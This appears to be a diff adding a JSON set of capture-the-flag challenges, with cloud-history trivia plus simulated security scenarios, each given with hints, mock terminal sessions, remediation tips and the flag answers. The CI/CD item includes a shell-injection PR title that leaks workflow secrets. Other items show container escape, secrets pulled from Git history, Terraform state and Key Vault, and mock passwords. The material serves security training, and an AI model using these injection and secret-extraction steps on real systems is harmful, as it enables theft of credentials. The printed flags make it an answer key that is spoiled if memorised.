@@ -1,0 +1,391 @@
+[
+  {
+    "title": "AWS Origins",
+    "description": "Test your knowledge of cloud computing history!\n\n**Question:** What was Amazon Web Services' (AWS) first publicly available web service, launched in 2004?\n\n**Learning Context:**\nAmazon Web Services revolutionized cloud computing by offering infrastructure as a service. Understanding the origins helps us appreciate how cloud architecture evolved.\n\n**Microsoft Learn Reference:**\nWhile this is about AWS history, understanding competing cloud platforms helps you make informed architectural decisions. Azure offers similar services - learn about Azure's messaging services at: https://learn.microsoft.com/en-us/azure/service-bus-messaging/\n\n**Hint:** It's still one of the most popular AWS services today for distributed systems and starts with an 'S'. Think about message queuing.\n\n**Answer Format:** Enter the service name in all caps (e.g., flag{SERVICENAME})",
+    "difficulty": "easy",
+    "category": "Trivia",
+    "points": 50,
+    "flag": "flag{SQS}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": false,
+      "estimated_time": "2 minutes",
+      "learning_resources": [
+        {
+          "title": "Azure Service Bus vs AWS SQS",
+          "url": "https://learn.microsoft.com/en-us/azure/service-bus-messaging/service-bus-messaging-overview",
+          "description": "Compare Azure Service Bus with AWS SQS to understand cloud messaging patterns"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Azure Goes Global",
+    "description": "Azure has data centers all around the world. Let's see how well you know their expansion history!\n\n**Question:** In which country did Microsoft Azure build its first international data center region outside of the United States? (Launched in 2009)\n\n**Learning Context:**\nAzure's global expansion strategy focused on data residency, latency, and compliance requirements. Understanding Azure's geography helps with designing resilient, compliant applications.\n\n**Microsoft Learn Reference:**\nLearn about Azure regions and availability zones: https://learn.microsoft.com/en-us/azure/reliability/availability-zones-overview\n\n**Hint:** This European country is known for its advanced infrastructure and strict data privacy laws. It's also a major tech hub.\n\n**Answer Format:** Enter the country name (e.g., flag{COUNTRYNAME})",
+    "difficulty": "easy",
+    "category": "Trivia",
+    "points": 50,
+    "flag": "flag{IRELAND}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": false,
+      "estimated_time": "2 minutes",
+      "learning_resources": [
+        {
+          "title": "Azure Geographies and Regions",
+          "url": "https://learn.microsoft.com/en-us/azure/reliability/availability-zones-overview",
+          "description": "Understand how Azure organizes its global infrastructure"
+        },
+        {
+          "title": "Data Residency in Azure",
+          "url": "https://learn.microsoft.com/en-us/azure/compliance/offerings/offering-eu-data-boundary",
+          "description": "Learn about data sovereignty and compliance"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Container Revolution",
+    "description": "Containers have revolutionized how we deploy applications. How well do you know their history?\n\n**Question:** What year was Docker, the platform that popularized containerization, first released to the public?\n\n**Learning Context:**\nContainers provide lightweight virtualization for applications. Understanding container history helps you appreciate modern orchestration platforms like Kubernetes and Azure Container Instances.\n\n**Microsoft Learn Reference:**\nIntroduction to containers on Azure: https://learn.microsoft.com/en-us/azure/container-instances/container-instances-overview\n\n**Hint:** It was in the early 2010s, and the project was originally called \"dotCloud\" before pivoting to focus on containers.\n\n**Answer Format:** Enter the 4-digit year (e.g., flag{YYYY})",
+    "difficulty": "easy",
+    "category": "Trivia",
+    "points": 50,
+    "flag": "flag{2013}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": false,
+      "estimated_time": "2 minutes",
+      "learning_resources": [
+        {
+          "title": "Container Instances Overview",
+          "url": "https://learn.microsoft.com/en-us/azure/container-instances/container-instances-overview",
+          "description": "Learn about running containers in Azure"
+        },
+        {
+          "title": "Azure Kubernetes Service (AKS)",
+          "url": "https://learn.microsoft.com/en-us/azure/aks/intro-kubernetes",
+          "description": "Understand container orchestration on Azure"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Azure Blob Storage Misconfiguration",
+    "description": "A company has deployed an Azure Storage Account for their web application. During a security audit, you've gained access to their Azure subscription with read-only permissions.\n\n**Scenario:** The development team deployed a storage account for hosting static website assets, but they may have misconfigured the access controls.\n\n**Your Mission:** Investigate the storage account configuration and find the flag that proves public data exposure is possible.\n\n**Skills Required:** Azure Storage, access control analysis, cloud security best practices",
+    "difficulty": "easy",
+    "category": "Cloud Security",
+    "points": 100,
+    "flag": "flag{pub1ic_bl0bs_l3ak_d4ta}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": true,
+      "estimated_time": "15 minutes",
+      "terminal": [
+        {
+          "command": "az storage account list --resource-group prod-web-rg --output table",
+          "output": "Name                  ResourceGroup    Location    StatusOfPrimary    AccessTier\n--------------------  ---------------  ----------  -----------------  ------------\nsentinelctf2025data   prod-web-rg      eastus      available          Hot"
+        },
+        {
+          "command": "az storage account show --name sentinelctf2025data --resource-group prod-web-rg --query \"{Name:name, PublicAccess:allowBlobPublicAccess, TLS:minimumTlsVersion, HTTPS:supportsHttpsTrafficOnly}\"",
+          "output": "{\n  \"HTTPS\": false,\n  \"Name\": \"sentinelctf2025data\",\n  \"PublicAccess\": true,\n  \"TLS\": \"TLS1_0\"\n}"
+        },
+        {
+          "command": "az storage account show --name sentinelctf2025data --resource-group prod-web-rg --query \"networkRuleSet\"",
+          "output": "{\n  \"bypass\": \"AzureServices\",\n  \"defaultAction\": \"Allow\",\n  \"ipRules\": [],\n  \"virtualNetworkRules\": []\n}"
+        },
+        {
+          "command": "az storage container list --account-name sentinelctf2025data --output table",
+          "output": "Name              Lease Status    Public Access\n----------------  --------------  ---------------\nwebsite-assets    unlocked        blob\ncustomer-data     unlocked        container\nbackups           unlocked        off"
+        },
+        {
+          "command": "az storage blob list --account-name sentinelctf2025data --container-name customer-data --output table",
+          "output": "Name                          Blob Type    Blob Tier    Length    Content Type              Last Modified\n----------------------------  -----------  -----------  --------  ------------------------  -------------------------\ncustomer-records-2025-q1.csv  BlockBlob    Hot          2048576   text/csv                  2025-01-15T14:23:19+00:00\nemployee-data.json            BlockBlob    Hot          1572864   application/json          2025-02-03T09:15:42+00:00\naudit-logs-jan.txt            BlockBlob    Hot          524288    text/plain                2025-01-31T23:59:01+00:00\nsecrets.json                  BlockBlob    Hot          4096      application/json          2025-03-01T08:30:15+00:00\n\n💡 Hint: You've found publicly accessible blobs! Try downloading one of these files to examine its contents.\nUse: az storage blob download --account-name <account> --container-name <container> --name <blob-name>"
+        }
+      ],
+      "hints": [
+        {
+          "text": "Look for containers with public access enabled. What sensitive data might be stored there?",
+          "cost": 10
+        },
+        {
+          "text": "The flag is hidden in a publicly accessible blob. Try downloading files from the customer-data container.",
+          "cost": 20
+        }
+      ],
+      "learning_resources": [
+        {
+          "title": "Azure Storage Security Guide",
+          "url": "https://learn.microsoft.com/en-us/azure/storage/common/storage-security-guide",
+          "description": "Comprehensive guide to securing Azure Storage accounts"
+        },
+        {
+          "title": "Configure Anonymous Public Read Access",
+          "url": "https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-configure",
+          "description": "Understand blob public access settings and risks"
+        },
+        {
+          "title": "Storage Account Best Practices",
+          "url": "https://learn.microsoft.com/en-us/azure/storage/common/storage-account-overview",
+          "description": "Best practices for Azure Storage configuration"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Git History Detective",
+    "description": "A developer accidentally committed sensitive credentials to a repository and later removed them. However, git never forgets!\n\n**Scenario:** You're performing a security audit on a company's codebase. The developers claim they've removed all secrets, but you suspect something might be hidden in the git history.\n\n**Your Mission:** Investigate the commit history to find an API key that was committed and later removed.\n\n**Learning Objectives:**\n- Understand git commit history and how deleted data persists\n- Learn secret scanning techniques\n- Apply security best practices for secret management\n\n**Microsoft Learn References:**\n- GitHub secret scanning: https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning\n- Azure Key Vault for secrets: https://learn.microsoft.com/en-us/azure/key-vault/general/overview\n\n**Skills Required:** Git history analysis, secret scanning, DevSecOps best practices",
+    "difficulty": "easy",
+    "category": "DevSecOps",
+    "points": 150,
+    "flag": "flag{g1t_h1st0ry_n3v3r_f0rg3ts}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": true,
+      "estimated_time": "15 minutes",
+      "terminal": [
+        {
+          "command": "git log --oneline",
+          "output": "a7b3c9d (HEAD -> main) Remove sensitive data from repository\nf2e4d8c Update README with security best practices\n9c1a5f7 Add environment variable example\n3e8b2a4 Fix typo in documentation\n7d4f1c6 Initial commit with app structure"
+        },
+        {
+          "command": "git show a7b3c9d",
+          "output": "commit a7b3c9d487e2f1a9b5c3d6e8f0a2b4c6d8e0f2a4\nAuthor: Dev User <dev@example.com>\nDate:   Mon Oct 28 14:32:15 2025 -0700\n\n    Remove sensitive data from repository\n\ndiff --git a/.env b/.env\ndeleted file mode 100644\nindex 8e7f9a2..0000000\n--- a/.env\n+++ /dev/null\n@@ -1,4 +0,0 @@\n-DATABASE_URL=postgresql://localhost:5432/myapp\n-API_BASE_URL=https://api.example.com\n-API_KEY=sk-prod-abc123xyz789\n-LOG_LEVEL=info\n\n⚠️  A .env file was deleted with an API key exposed!\n   But wait... was there more in that file?\n   \n💡 Tip: The diff above shows 4 lines removed, but notice the range: @@ -1,4 +0,0 @@\n   This means 4 lines were deleted. But sometimes git truncates output for readability.\n   Try viewing the actual file content before deletion:\n   \n   git show a7b3c9d^:.env"
+        },
+        {
+          "command": "git show a7b3c9d^:.env",
+          "output": "DATABASE_URL=postgresql://localhost:5432/myapp\nAPI_BASE_URL=https://api.example.com\nAPI_KEY=sk-prod-abc123xyz789\nSECRET_FLAG=flag{g1t_h1st0ry_n3v3r_f0rg3ts}\nLOG_LEVEL=info\n\n🎯 SUCCESS! You found the exposed secret in the git history!\n\n📊 Analysis: The .env file contained sensitive credentials including:\n- An API_KEY (sk-prod-abc123xyz789)\n- A SECRET_FLAG that should never have been committed\n\nThis is a common mistake - developers commit secrets then try to remove them.\nBut git never forgets! The secret remains in the commit history.\n\n🔒 Security Best Practices:\n1. Never commit secrets to git repositories\n2. Use .gitignore to exclude .env files\n3. Store secrets in Azure Key Vault or similar services\n4. Use GitHub Advanced Security for secret scanning\n5. If secrets are exposed, rotate them immediately AND clean git history\n6. Use tools like git-filter-repo or BFG Repo-Cleaner to remove secrets from history\n\n📚 Learn More:\n- Azure Key Vault: https://learn.microsoft.com/en-us/azure/key-vault/\n- Secret Scanning: https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning"
+        }
+      ],
+      "hints": [
+        {
+          "text": "Use \"git log --oneline\" to see recent commits. Look for commits mentioning \"remove\" or \"sensitive\".",
+          "cost": 15
+        },
+        {
+          "text": "Once you find the suspicious commit (a7b3c9d), use \"git show a7b3c9d^:.env\" to view the .env file content before it was deleted.",
+          "cost": 30
+        }
+      ],
+      "learning_resources": [
+        {
+          "title": "Secret Scanning in Azure DevOps",
+          "url": "https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning",
+          "description": "Learn how to automatically detect secrets in your repositories"
+        },
+        {
+          "title": "Azure Key Vault Best Practices",
+          "url": "https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices",
+          "description": "Proper way to manage secrets in production"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Terraform State File Exposure",
+    "description": "An organization stores their Terraform state files with improper access controls. State files contain the complete infrastructure configuration, including sensitive data.\n\n**Scenario:** During a penetration test, you discovered a publicly accessible S3 bucket containing Terraform state files. These files may contain secrets that should have been stored securely.\n\n**Your Mission:** Analyze the exposed state file and extract sensitive information that proves the security risk.\n\n**Learning Objectives:**\n- Understand Terraform state file contents and risks\n- Learn about secure state management\n- Apply Infrastructure as Code security best practices\n\n**Microsoft Learn References:**\n- Secure Terraform state storage: https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage\n- Azure Database security best practices: https://learn.microsoft.com/en-us/azure/postgresql/flexible-server/concepts-best-practices-security\n- Terraform with Azure: https://learn.microsoft.com/en-us/azure/developer/terraform/overview\n\n**Skills Required:** Terraform, IaC security, state file analysis, JSON parsing",
+    "difficulty": "medium",
+    "category": "Infrastructure as Code",
+    "points": 200,
+    "flag": "flag{st4t3_f1l3s_c0nt41n_s3cr3ts}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": true,
+      "estimated_time": "20 minutes",
+      "terminal": [
+        {
+          "command": "cat terraform.tfstate | jq '.'",
+          "output": "{\n  \"version\": 4,\n  \"terraform_version\": \"1.5.0\",\n  \"outputs\": {\n    \"deployment_secret\": {\n      \"value\": \"flag{st4t3_f1l3s_c0nt41n_s3cr3ts}\",\n      \"type\": \"string\",\n      \"sensitive\": true\n    }\n  },\n  \"resources\": [...]\n}\n\nUse jq to filter specific sections:\n  - Resources: cat terraform.tfstate | jq \".resources\"\n  - Outputs: cat terraform.tfstate | jq \".outputs\"\n  \n💡 Tip: State files contain multiple sections that may hold sensitive data"
+        },
+        {
+          "command": "cat terraform.tfstate | jq \".resources[] | select(.type == \\\"azurerm_postgresql_server\\\")\"",
+          "output": "{\n  \"type\": \"azurerm_postgresql_server\",\n  \"instances\": [\n    {\n      \"attributes\": {\n        \"administrator_login\": \"dbadmin\",\n        \"administrator_login_password\": \"P@ssw0rd123!Prod\",\n        \"fqdn\": \"proddb.postgres.database.azure.com\"\n      }\n    }\n  ]\n}\n\n⚠️  WARNING: Database password exposed in state file!\n   Password: P@ssw0rd123!Prod\n   \n   This demonstrates why state files are dangerous.\n   But there's more... what other secrets might be in this file?"
+        },
+        {
+          "command": "cat terraform.tfstate | jq \".outputs\"",
+          "output": "{\n  \"database_endpoint\": {\n    \"value\": \"proddb.postgres.database.azure.com:5432\",\n    \"type\": \"string\"\n  },\n  \"deployment_secret\": {\n    \"value\": \"flag{st4t3_f1l3s_c0nt41n_s3cr3ts}\",\n    \"type\": \"string\",\n    \"sensitive\": true\n  }\n}\n\n🎯 SUCCESS! You found the flag in the outputs section!\n\nEven though this output was marked as \"sensitive\": true in Terraform,\nthe state file stores it in PLAIN TEXT. This is why state files must be:\n- Encrypted at rest\n- Stored in secure backends (Azure Storage, S3, Terraform Cloud)\n- Access-controlled with proper IAM/RBAC\n- Never committed to version control\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage"
+        }
+      ],
+      "hints": [
+        {
+          "text": "Terraform state files are JSON documents. Use \"jq\" to parse and filter resources by type. Look for database or storage resources.",
+          "cost": 20
+        },
+        {
+          "text": "Search for \"azurerm_postgresql_server\" in the state file. The administrator_login_password attribute contains the database password. Also check the outputs section.",
+          "cost": 40
+        }
+      ],
+      "learning_resources": [
+        {
+          "title": "Store Terraform State in Azure Storage",
+          "url": "https://learn.microsoft.com/en-us/azure/developer/terraform/store-state-in-azure-storage",
+          "description": "Learn how to securely store Terraform state files"
+        },
+        {
+          "title": "Azure Key Vault for Terraform",
+          "url": "https://learn.microsoft.com/en-us/azure/key-vault/general/overview",
+          "description": "Use Key Vault to manage secrets in Terraform"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Container Escape Challenge",
+    "description": "You've gained access to a Docker container running with excessive privileges. Can you escape to the host system?\n\n**Scenario:** A development team deployed a container with privileged mode enabled \"for testing\". This is a common misconfiguration that can lead to container escape vulnerabilities.\n\n**Your Mission:** Explore the container's capabilities and find a way to access the host filesystem to retrieve the flag.\n\n**Learning Objectives:**\n- Understand Docker security boundaries\n- Learn about Linux capabilities and namespaces\n- Apply container hardening best practices\n\n**Microsoft Learn References:**\n- Azure Container security: https://learn.microsoft.com/en-us/azure/container-instances/container-instances-image-security\n- AKS security concepts: https://learn.microsoft.com/en-us/azure/aks/concepts-security\n\n**Skills Required:** Docker, Linux capabilities, privilege escalation, container security\n\n**Note:** This is a simulated environment. The techniques demonstrated should only be used for educational purposes in authorized environments.",
+    "difficulty": "hard",
+    "category": "Container Security",
+    "points": 300,
+    "flag": "flag{c0nt41n3r_3sc4p3_m4st3r}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": true,
+      "estimated_time": "30 minutes",
+      "terminal": [
+        {
+          "command": "whoami",
+          "output": "root\n\n⚠️  Running as root inside container"
+        },
+        {
+          "command": "cat /proc/1/cgroup",
+          "output": "12:devices:/docker/a1b2c3d4e5f6\n11:memory:/docker/a1b2c3d4e5f6\n10:cpu:/docker/a1b2c3d4e5f6\n\n✅ Confirmed: Running inside a Docker container"
+        },
+        {
+          "command": "capsh --print",
+          "output": "Current: = cap_chown,cap_dac_override,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+eip\n\n⚠️  DANGER: cap_sys_admin is enabled\n   This capability allows mounting filesystems and other privileged operations\n   \n💡 Hint: With these capabilities, what directories might be accessible?"
+        },
+        {
+          "command": "ls -la /",
+          "output": "drwxr-xr-x  20 root root  4096 Nov  1 00:00 .\ndrwxr-xr-x  20 root root  4096 Nov  1 00:00 ..\ndrwxr-xr-x   2 root root  4096 Oct 28 00:00 app\ndrwxr-xr-x  20 root root  4096 Oct 28 00:00 host\n\n🤔 Interesting... there's a 'host' directory. \n   In privileged containers, the host filesystem is often mounted.\n   \n💡 What sensitive files might be on a host system?"
+        },
+        {
+          "command": "ls -la /host/root",
+          "output": "drwx------  8 root root  4096 Oct 29 00:00 .\ndrwxr-xr-x 20 root root  4096 Nov  1 00:00 ..\n-rw-------  1 root root  1234 Oct 29 00:00 flag.txt\n\n🚨 HOST FILESYSTEM ACCESSIBLE!\n   Privileged container can access the entire host system.\n   \n💡 You found flag.txt! Use 'cat /host/root/flag.txt' to read it."
+        },
+        {
+          "command": "cat /host/root/flag.txt",
+          "output": "flag{c0nt41n3r_3sc4p3_m4st3r}\n\n🎯 SUCCESS! Container escape achieved!\n\nYou exploited a privileged container configuration to access the host filesystem.\n\n🔒 Prevention:\n- Never use privileged: true in production\n- Drop all capabilities and only add what's needed\n- Use non-root users\n- Enable read-only root filesystem\n- Implement resource limits\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/aks/concepts-security"
+        }
+      ],
+      "hints": [
+        {
+          "text": "Check what capabilities the container has using \"capsh --print\". Look for dangerous capabilities like CAP_SYS_ADMIN.",
+          "cost": 30
+        },
+        {
+          "text": "Inspect the filesystem. Is there a /host directory? Privileged containers often have the host filesystem mounted.",
+          "cost": 50
+        }
+      ],
+      "learning_resources": [
+        {
+          "title": "Azure Container Instances Security",
+          "url": "https://learn.microsoft.com/en-us/azure/container-instances/container-instances-image-security",
+          "description": "Learn about securing containers in Azure"
+        },
+        {
+          "title": "AKS Security Best Practices",
+          "url": "https://learn.microsoft.com/en-us/azure/aks/concepts-security",
+          "description": "Understand Kubernetes security in Azure"
+        }
+      ]
+    }
+  },
+  {
+    "title": "Azure Key Vault Exploitation",
+    "description": "A web application uses Azure Key Vault to store secrets, but has misconfigured access policies that allow unauthorized access.\n\n**Scenario:** You're pentesting a web application that uses Managed Identity to access Azure Key Vault. The developers configured overly permissive access policies, assuming \"only Azure services\" would access the vault.\n\n**Your Mission:** Exploit the misconfigured Key Vault access policies to retrieve the flag secret.\n\n**Learning Objectives:**\n- Understand Azure Key Vault access models (Access Policies vs RBAC)\n- Learn about Managed Identities and their security implications\n- Apply principle of least privilege to Key Vault\n\n**Microsoft Learn References:**\n- Key Vault security: https://learn.microsoft.com/en-us/azure/key-vault/general/security-features\n- Managed Identity: https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview\n\n**Skills Required:** Azure Key Vault, Managed Identities, RBAC, API exploitation",
+    "difficulty": "hard",
+    "category": "Cloud Security",
+    "points": 400,
+    "flag": "flag{k3y_v4ult_m1sc0nf1g_pwn3d}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": true,
+      "estimated_time": "45 minutes",
+      "terminal": [
+        {
+          "command": "az keyvault show --name sentinelforge-kv --query \"properties.{PublicAccess:publicNetworkAccess,NetworkDefault:networkAcls.defaultAction,RBAC:enableRbacAuthorization}\"",
+          "output": "{\n  \"NetworkDefault\": \"Allow\",\n  \"PublicAccess\": \"Enabled\",\n  \"RBAC\": false\n}\n\n⚠️  Key Vault is publicly accessible with no network restrictions!"
+        },
+        {
+          "command": "az keyvault secret list --vault-name sentinelforge-kv --output table",
+          "output": "Name                    Enabled\n----------------------  ---------\ndatabase-password       True\napi-key-production      True\nadmin-credentials       True\nflag-secret             True\n\n💡 Managed identity can list all secrets in the vault!\n   This violates the principle of least privilege.\n   \n🔍 Try retrieving one of these secrets..."
+        },
+        {
+          "command": "az keyvault secret show --vault-name sentinelforge-kv --name flag-secret --query \"value\"",
+          "output": "\"flag{k3y_v4ult_m1sc0nf1g_pwn3d}\"\n\n🎯 SUCCESS! You found the flag!\n\nThe Key Vault misconfiguration allowed you to:\n1. List all secrets in the vault (overly permissive access policy)\n2. Retrieve any secret without proper network restrictions\n3. Access the vault from the public internet\n\n🔒 Secure Configuration:\n- Enable RBAC authorization\n- Disable public network access\n- Use Private Endpoints\n- Grant access only to specific secrets needed\n\n📚 Learn More:\n- https://learn.microsoft.com/en-us/azure/key-vault/general/security-features"
+        }
+      ],
+      "hints": [
+        {
+          "text": "The Key Vault has public network access enabled. Try using the Azure CLI to list secrets.",
+          "cost": 40
+        },
+        {
+          "text": "The managed identity has \"get\" and \"list\" permissions. First list all secrets, then retrieve the flag-secret.",
+          "cost": 80
+        }
+      ],
+      "learning_resources": [
+        {
+          "title": "Azure Key Vault Security Features",
+          "url": "https://learn.microsoft.com/en-us/azure/key-vault/general/security-features",
+          "description": "Comprehensive guide to Key Vault security"
+        },
+        {
+          "title": "Key Vault Network Security",
+          "url": "https://learn.microsoft.com/en-us/azure/key-vault/general/network-security",
+          "description": "Configure firewall and virtual networks"
+        }
+      ]
+    }
+  },
+  {
+    "title": "CI/CD Pipeline Injection",
+    "description": "A GitHub Actions workflow has a code injection vulnerability that allows attackers to execute arbitrary code in the CI/CD pipeline.\n\n**Scenario:** You're auditing a company's GitHub Actions workflows and discovered that user-controlled data is being used unsafely in workflow commands. This is a critical vulnerability that can lead to secret exfiltration and supply chain attacks.\n\n**Your Mission:** Exploit the vulnerable workflow to extract secrets and retrieve the flag.\n\n**Learning Objectives:**\n- Understand CI/CD security risks\n- Learn about GitHub Actions injection vulnerabilities\n- Apply secure workflow practices\n\n**Microsoft Learn References:**\n- GitHub Advanced Security: https://docs.github.com/en/code-security/getting-started/github-security-features\n- Secure DevOps: https://learn.microsoft.com/en-us/devops/operate/security-in-devops\n\n**Skills Required:** GitHub Actions, CI/CD security, code injection, YAML analysis",
+    "difficulty": "hard",
+    "category": "DevSecOps",
+    "points": 350,
+    "flag": "flag{c1cd_1nj3ct10n_d4ng3r0us}",
+    "is_active": true,
+    "metadata": {
+      "hints_available": true,
+      "estimated_time": "30 minutes",
+      "terminal": [
+        {
+          "command": "cat .github/workflows/ci.yml | grep -A 3 \"pull_request.title\"",
+          "output": "      - name: Run tests\n        run: |\n          echo \"Testing PR: ${{ github.event.pull_request.title }}\"\n          npm test\n\n⚠️  VULNERABILITY FOUND: Unsanitized user input in shell command!\n   The PR title is directly interpolated into a bash command.\n   \n💡 What happens if the PR title contains shell metacharacters?"
+        },
+        {
+          "command": "cat .github/workflows/ci.yml | grep -A 5 \"Deploy\"",
+          "output": "      - name: Deploy\n        env:\n          API_KEY: ${{ secrets.API_KEY }}\n          FLAG_SECRET: ${{ secrets.FLAG_SECRET }}\n        run: |\n          echo \"Deploying application...\"\n\n🔍 Secrets are loaded into environment variables.\n   If you can inject code, you could exfiltrate these!\n   \n💡 Try crafting a malicious PR title that echoes environment variables..."
+        },
+        {
+          "command": "gh pr create --title 'Test\"; echo $FLAG_SECRET; echo \"' --body \"Exploit injection\"",
+          "output": "Creating pull request...\n\n✅ Pull request created successfully!\n   Workflow triggered...\n   \n📋 Workflow execution logs:\n\nRun tests\n  echo \"Testing PR: Test\"; echo $FLAG_SECRET; echo \"\"\n  Testing PR: Test\n  flag{c1cd_1nj3ct10n_d4ng3r0us}\n  \n  npm test\n  ✓ app works (2 ms)\n\n🎯 SUCCESS! The injection worked!\n\nThe workflow executed your malicious command and exposed the FLAG_SECRET.\n\n🔒 Remediation:\n1. Never use ${{ }} expressions directly with user input\n2. Use environment variables or toJSON()\n3. Enable GitHub Advanced Security\n\n📚 Learn More:\n- https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions"
+        }
+      ],
+      "hints": [
+        {
+          "text": "Look at the CI workflow file. Notice how github.event.pull_request.title is used directly in a shell command. What if the PR title contained special characters?",
+          "cost": 35
+        },
+        {
+          "text": "Try creating a PR with a title containing shell metacharacters like \"; echo $FLAG_SECRET; echo \". The workflow will execute your injected command.",
+          "cost": 70
+        }
+      ],
+      "learning_resources": [
+        {
+          "title": "GitHub Actions Security Hardening",
+          "url": "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions",
+          "description": "Best practices for securing GitHub Actions workflows"
+        },
+        {
+          "title": "Preventing Script Injections",
+          "url": "https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections",
+          "description": "Understanding and preventing script injection attacks"
+        }
+      ]
+    }
+  }
+]
